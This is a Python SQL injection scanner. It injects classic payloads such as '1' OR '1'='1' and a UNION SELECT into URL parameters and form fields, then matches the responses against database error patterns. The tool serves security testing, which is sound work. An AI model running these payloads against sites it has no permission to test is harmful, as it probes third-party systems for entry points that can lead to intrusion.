import requests
from bs4 import BeautifulSoup as bs
from urllib.parse import urljoin, urlparse, parse_qs, urlencode
import sys

# Color codes for terminal output
COLOR_RED = "\033[91m"
COLOR_GREEN = "\033[92m"
COLOR_YELLOW = "\033[93m"
COLOR_RESET = "\033[0m"

# Session to persist cookies (if needed)
s = requests.Session()
s.headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36"

# Common SQL Injection Payloads
PAYLOADS = [
    "'",
    '"',
    "1' OR '1'='1",
    '1" OR "1"="1',
    "' OR 1=1 --",
    '" OR 1=1 --',
    "' OR '1'='1' --",
    "' UNION SELECT 1, 'test', 3 --",
]

# Database error signatures to look for in responses
ERRORS = {
    "MySQL": (r"SQL syntax.*MySQL", r"Warning.*mysql_.*", r"valid MySQL result", r"MySqlException"),
    "PostgreSQL": (r"PostgreSQL.*ERROR", r"Warning.*\Wpg_.*", r"valid PostgreSQL result", r"Npgsql."),
    "Microsoft SQL Server": (r"Driver.* SQL[\-\_\ ]*Server", r"OLE DB.* SQL Server", r"(\W|\A)SQL Server.*Driver", r"Warning.*mssql_.*", r"(\W|\A)SQL Server.*[0-9a-fA-F]{8}", r"(?s)Exception.*\WSystem\.Data\.SqlClient\.", r"(?s)Exception.*\WRoadhouse\.Cms\."),
    "Microsoft Access": (r"Microsoft Access Driver", r"JET Database Engine", r"Access Database Engine"),
    "Oracle": (r"\bORA-[0-9][0-9][0-9][0-9]", r"Oracle error", r"Oracle.*Driver", r"Warning.*\Woci_.*", r"Warning.*\Wora_.*"),
    "IBM DB2": (r"CLI Driver.*DB2", r"DB2 SQL error", r"\bdb2_\w+\("),
    "SQLite": (r"SQLite/JDBCDriver", r"SQLite.Exception", r"System.Data.SQLite.SQLiteException", r"Warning.*sqlite_.*", r"Warning.*SQLite3::", r"\[SQLITE_ERROR\]", r"sqlite3.OperationalError:", r"unrecognized token:", r"near \".*\": syntax error"),
    "Sybase": (r"(?i)Warning.*sybase.*", r"Sybase message", r"Sybase Driver", r"SybSQLException"),
}

import re

def get_all_forms(url):
    """Returns all form tags from the HTML content of the URL."""
    try:
        response = s.get(url)
    except requests.exceptions.RequestException as e:
        print(f"{COLOR_RED}[!] Connection error: {e}{COLOR_RESET}")
        return []
    
    soup = bs(response.content, "html.parser")
    return soup.find_all("form")

def get_form_details(form):
    """Extracts useful information from a form."""
    details = {}
    
    # get the form action (target url)
    try:
        action = form.attrs.get("action").lower()
    except:
        action = None
    
    # get the form method (POST, GET, etc.)
    method = form.attrs.get("method", "get").lower()
    
    # get all the input details such as type and name
    inputs = []
    for input_tag in form.find_all("input"):
        input_type = input_tag.attrs.get("type", "text")
        input_name = input_tag.attrs.get("name")
        input_value = input_tag.attrs.get("value", "")
        inputs.append({"type": input_type, "name": input_name, "value": input_value})
    
    details["action"] = action
    details["method"] = method
    details["inputs"] = inputs
    return details

def is_vulnerable(response):
    """A simple boolean function that determines whether a page 
    is SQL Injection vulnerable from its `response`"""
    for db, errors in ERRORS.items():
        for error in errors:
            if re.search(error, response.content.decode(errors="ignore"), re.I):
                return True, db
    return False, None

def scan_sql_injection(url):
    """
    Scans a URL for SQL Injection vulnerabilities in forms and query parameters.
    """
    is_vuln = False
    
    # 1. Test URL Query Parameters
    parsed = urlparse(url)
    if parsed.query:
        print(f"{COLOR_YELLOW}[*] Scanning URL parameters for {url}{COLOR_RESET}")
        params = parse_qs(parsed.query)
        # params is a dict: {'id': ['1'], 'cat': ['book']}
        
        for param in params:
            for payload in PAYLOADS:
                # Construct new URL with payload
                # Copy params to avoid modifying original loop
                new_params = params.copy()
                new_params[param] = payload # replace value with payload
                
                # Reconstruct URL
                # Note: urlencode handles list values but we simplified to single value here for injection
                # For robust handling:
                query_string = urlencode(new_params, doseq=True)
                new_url = parsed._replace(query=query_string).geturl()
                
                print(f"  [~] Testing parameter '{param}' with payload: {payload[:20]}...", end="\r")
                
                try:
                    res = s.get(new_url)
                    vuln, db = is_vulnerable(res)
                    if vuln:
                        print(f"\n{COLOR_GREEN}[+] SQL Injection vulnerability detected (URL Parameter)!{COLOR_RESET}")
                        print(f"    Target: {new_url}")
                        print(f"    Database: {db}")
                        is_vuln = True
                        # We can return here or continue scanning other params
                        # return # Uncomment to stop at first find
                except Exception as e:
                    pass

    # 2. Test Forms
    forms = get_all_forms(url)
    print(f"\n{COLOR_YELLOW}[*] Detected {len(forms)} forms on {url}{COLOR_RESET}")
    
    for form in forms:
        form_details = get_form_details(form)
        content = ""
        
        for payload in PAYLOADS:
            # the data body we want to submit
            data = {}
            for input_tag in form_details["inputs"]:
                if input_tag["type"] == "hidden" or input_tag["value"]:
                    # Use existing value for hidden/filled fields as default
                    # But also try injecting into them if we want to be thorough. 
                    # For now, let's inject into text/search/etc fields mainly.
                    try:
                        data[input_tag["name"]] = input_tag["value"] + payload
                    except:
                        pass
                elif input_tag["type"] != "submit":
                    # inject payload into other fields
                    data[input_tag["name"]] = f"test{payload}"
            
            # join the url with the action (form request URL)
            target_url = urljoin(url, form_details["action"])
            
            print(f"  [~] Testing form to {target_url} with payload: {payload[:20]}...", end="\r")
            
            try:
                if form_details["method"] == "post":
                    res = s.post(target_url, data=data)
                elif form_details["method"] == "get":
                    res = s.get(target_url, params=data)
                
                vuln, db = is_vulnerable(res)
                if vuln:
                    print(f"\n{COLOR_GREEN}[+] SQL Injection vulnerability detected (Form)!{COLOR_RESET}")
                    print(f"    Target: {target_url}")
                    print(f"    Database: {db}")
                    print(f"    Data: {data}")
                    is_vuln = True
                    break # Stop testing payloads for this form if one works
            except Exception as e:
                # print(e)
                pass

    if not is_vuln:
        print(f"\n{COLOR_RED}[-] No SQL injection vulnerability detected.{COLOR_RESET}")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python scanner.py <url>")
        sys.exit(1)
    
    url = sys.argv[1]
    scan_sql_injection(url)
